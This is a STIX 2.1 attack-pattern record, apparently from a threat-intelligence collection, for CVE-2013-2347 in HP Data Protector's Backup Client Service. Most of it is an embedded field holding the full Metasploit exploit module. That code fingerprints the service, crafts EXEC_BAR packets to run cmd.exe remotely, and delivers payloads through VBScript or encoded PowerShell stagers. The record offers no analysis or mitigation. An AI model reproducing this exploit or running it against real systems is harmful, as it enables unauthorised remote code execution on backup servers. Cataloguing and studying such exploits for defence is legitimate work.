{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0d8e388f-079f-4f8e-9d5c-6707a3197eb9",
    "created": "2024-08-14T16:47:24.030102Z",
    "modified": "2024-08-14T16:47:24.030106Z",
    "name": "HP Data Protector Backup Client Service Remote Code Execution",
    "description": " This module abuses the Backup Client Service (OmniInet.exe) to achieve remote code execution. The vulnerability exists in the EXEC_BAR operation, which allows to execute arbitrary processes. This module has been tested successfully on HP Data Protector 6.20 on Windows 2003 SP2 and Windows 2008 R2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/hp_dataprotector_exec_bar.rb",
            "external_id": "hp_dataprotector_exec_bar.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-2347"
        },
        {
            "source_name": "reference",
            "url": "https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03822422"
        },
        {
            "source_name": "reference",
            "url": "http://ddilabs.blogspot.com/2014/02/fun-with-hp-data-protector-execbar.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP Data Protector Backup Client Service Remote Code Execution',\n      'Description'    => %q{\n        This module abuses the Backup Client Service (OmniInet.exe) to achieve remote code\n        execution. The vulnerability exists in the EXEC_BAR operation, which allows to\n        execute arbitrary processes. This module has been tested successfully on HP Data\n        Protector 6.20 on Windows 2003 SP2 and Windows 2008 R2.\n      },\n      'Author'         =>\n        [\n          'Aniway.Anyway <Aniway.Anyway[at]gmail.com>', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-2347' ],\n          [ 'BID', '64647' ],\n          [ 'ZDI', '14-008' ],\n          [ 'URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03822422' ],\n          [ 'URL', 'http://ddilabs.blogspot.com/2014/02/fun-with-hp-data-protector-execbar.html' ]\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'DisableNops' => true\n        },\n      'DefaultOptions'  =>\n        {\n          'CMDSTAGER::DECODER' => File.join(Rex::Exploitation::DATA_DIR, \"exploits\", \"cmdstager\", \"vbs_b64_noquot\")\n        },\n      'Platform'        => 'win',\n      'Targets'         =>\n        [\n          [ 'HP Data Protector 6.20 build 370 / VBScript CMDStager', { } ],\n          [ 'HP Data Protector 6.20 build 370 / Powershell', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-01-02'))\n\n    register_options(\n      [\n        Opt::RPORT(5555),\n        OptString.new('CMDPATH', [true, 'The cmd.exe path', 'c:\\\\windows\\\\system32\\\\cmd.exe'])\n      ])\n    deregister_options('CMDSTAGER::FLAVOR')\n  end\n\n  def check\n    fingerprint = get_fingerprint\n\n    if fingerprint.nil?\n      return Exploit::CheckCode::Unknown\n    end\n\n    print_status(\"HP Data Protector version #{fingerprint}\")\n\n    if fingerprint =~ /HP Data Protector A\\.06\\.(\\d+)/\n      minor = $1.to_i\n    else\n      return Exploit::CheckCode::Safe\n    end\n\n    if minor < 21\n      return Exploit::CheckCode::Appears\n    elsif minor == 21\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Detected\n    end\n\n  end\n\n  def exploit\n    if target.name =~ /VBScript CMDStager/\n      # 7500 just in case, to be sure the command fits after\n      # environment variables expansion\n      execute_cmdstager({:flavor => :vbs, :linemax => 7500})\n    elsif target.name =~ /Powershell/\n      # Environment variables are not being expanded before, neither in CreateProcess\n      command = cmd_psh_payload(payload.encoded, payload_instance.arch.first, {:remove_comspec => true, :encode_final_payload => true})\n      if command.length > 8000\n        # Windows 2008 Command Prompt Max Length is 8191\n        fail_with(Failure::BadConfig, \"#{peer} - The selected payload is too long to execute through powershell in one command\")\n      end\n      print_status(\"Exploiting through Powershell...\")\n      exec_bar(datastore['CMDPATH'], command, \"\\x00\")\n    end\n  end\n\n\n  def build_pkt(fields)\n    data = \"\\xff\\xfe\" # BOM Unicode\n    fields.each do |v|\n      data << \"#{Rex::Text.to_unicode(v)}\\x00\\x00\"\n      data << Rex::Text.to_unicode(\" \") # Separator\n    end\n\n    data.chomp!(Rex::Text.to_unicode(\" \")) # Delete last separator\n    return [data.length].pack(\"N\") + data\n  end\n\n  def get_fingerprint\n    ommni = connect\n    ommni.put(rand_text_alpha_upper(64))\n    resp = ommni.get_once(-1)\n    disconnect\n\n    if resp.nil?\n      return nil\n    end\n\n    Rex::Text.to_ascii(resp).chop.chomp # Delete unicode last null\n  end\n\n  def exec_bar(cmd, *args)\n    connect\n    pkt = build_pkt([\n      \"2\", # Message Type\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      \"11\", # Opcode EXEC_BAR\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      \"#{cmd}\", # Executable\n      rand_text_alpha(8)\n    ].concat(args))\n    sock.put(pkt)\n    # In my testings the default timeout (10) isn't enough\n    begin\n      res = sock.get_once(-1, 20)\n    rescue EOFError # happens when using the Powershell method\n      disconnect\n      return\n    end\n    fail_with(Failure::Unknown, \"#{peer} - Expected answer not received... aborting...\") unless exec_bar?(res)\n    disconnect\n  end\n\n  def exec_bar?(data)\n    return false if data.blank?\n    data_unpacked = data.unpack(\"NnVv\")\n    data_unpacked.length == 4 && data_unpacked[0] == 8 && data_unpacked[1] == 0xfffe && data_unpacked[2] == 0x36 && data_unpacked[3] == 0\n  end\n\n  def execute_command(cmd, opts = {})\n    exec_bar(datastore['CMDPATH'], \"/c #{cmd}\", \"\\x00\")\n  end\n\n  def get_vbs_string(str)\n    vbs_str = \"\"\n    str.each_byte { |b|\n      vbs_str << \"Chr(#{b})+\"\n    }\n\n    return vbs_str.chomp(\"+\")\n  end\n\n  # Make the modifications required to the specific encoder\n  # This exploit uses an specific encoder because quotes (\")\n  # aren't allowed when injecting commands\n  def execute_cmdstager_begin(opts)\n    var_decoded = @stager_instance.instance_variable_get(:@var_decoded)\n    var_encoded = @stager_instance.instance_variable_get(:@var_encoded)\n    decoded_file = \"#{var_decoded}.exe\"\n    encoded_file = \"#{var_encoded}.b64\"\n    @cmd_list.each do |command|\n      # Because the exploit kills cscript processes to speed up and reliability\n      command.gsub!(/cscript \\/\\/nologo/, \"wscript //nologo\")\n      command.gsub!(/CHRENCFILE/, get_vbs_string(encoded_file))\n      command.gsub!(/CHRDECFILE/, get_vbs_string(decoded_file))\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-01-02",
    "x_mitre_platforms": [
        "win'"
    ]
}